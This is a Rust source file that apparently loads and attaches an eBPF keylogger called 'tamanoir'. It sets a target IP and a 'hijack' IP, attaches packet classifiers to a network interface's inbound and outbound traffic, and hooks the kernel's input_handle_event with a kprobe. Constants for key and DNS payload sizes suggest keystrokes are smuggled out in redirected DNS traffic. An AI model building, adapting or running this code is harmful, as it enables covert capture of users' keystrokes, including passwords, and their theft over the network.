use std::{net::Ipv4Addr, str::FromStr};

use aya::{
    maps::HashMap,
    programs::{tc, KProbe, SchedClassifier, TcAttachType},
    EbpfLoader,
};
use clap::Parser;
use log::{debug, info, warn};
use tokio::signal;

#[derive(Debug, Parser)]
struct Opt {
    #[clap(short, long, default_value = "wlan0")]
    iface: String,

    #[clap(long, required = true)]
    target_ip: String,

    #[clap(long, required = true)]
    hijack_ip: String,
}
const KEYS_PAYLOAD_LEN: usize = 4;
const DNS_PAYLOAD_MAX_LEN: usize = 128;
#[tokio::main]
async fn main() -> anyhow::Result<()> {
    env_logger::init();

    let Opt {
        iface,
        target_ip,
        hijack_ip,
    } = Opt::parse();

    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        debug!("remove limit on locked memory failed, ret is: {}", ret);
    }

    let target_ip = Ipv4Addr::from_str(target_ip.as_str())?.to_bits();
    let hijack_ip = Ipv4Addr::from_str(hijack_ip.as_str())?.to_bits();

    let mut ebpf = EbpfLoader::new()
        .set_global("TARGET_IP", &target_ip, true)
        .set_global("HIJACK_IP", &hijack_ip, true)
        .load(aya::include_bytes_aligned!(concat!(
            env!("OUT_DIR"),
            "/tamanoir"
        )))?;

    if let Err(e) = aya_log::EbpfLogger::init(&mut ebpf) {
        warn!("failed to initialize eBPF logger: {}", e);
    }

    let _ = tc::qdisc_add_clsact(&iface);

    let tc_program_egress: &mut SchedClassifier = ebpf
        .program_mut("tamanoir_egress")
        .unwrap()
        .try_into()
        .unwrap();

    tc_program_egress.load().unwrap();
    tc_program_egress
        .attach(&iface, TcAttachType::Egress)
        .unwrap();

    let tc_program_ingress: &mut SchedClassifier = ebpf
        .program_mut("tamanoir_ingress")
        .unwrap()
        .try_into()
        .unwrap();

    tc_program_ingress.load().unwrap();
    tc_program_ingress
        .attach(&iface, TcAttachType::Ingress)
        .unwrap();

    let program: &mut KProbe = ebpf.program_mut("tamanoir_kprobe").unwrap().try_into()?;
    program.load()?;
    program.attach("input_handle_event", 0)?;

    let ctrl_c = signal::ctrl_c();
    println!("Waiting for Ctrl-C...");
    ctrl_c.await?;
    println!("Exiting...");

    Ok(())
}
